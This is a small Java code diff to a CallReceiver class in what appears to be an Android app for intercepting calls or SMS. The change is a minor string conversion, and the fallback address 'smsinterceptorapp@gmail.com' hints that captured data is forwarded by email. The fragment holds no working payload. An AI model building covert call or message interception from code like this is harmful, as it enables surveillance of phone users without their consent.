@@ -23,7 +23,7 @@ public class CallReceiver extends PhoneCallReceiver {
   public CallReceiver() { 
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) { 
-      gmailEmailString = configure.getEmailAddress();
+      gmailEmailString = String.valueOf(configure.getEmailAddress());
     }
     else {
       gmailEmailString = "smsinterceptorapp@gmail.com"; 
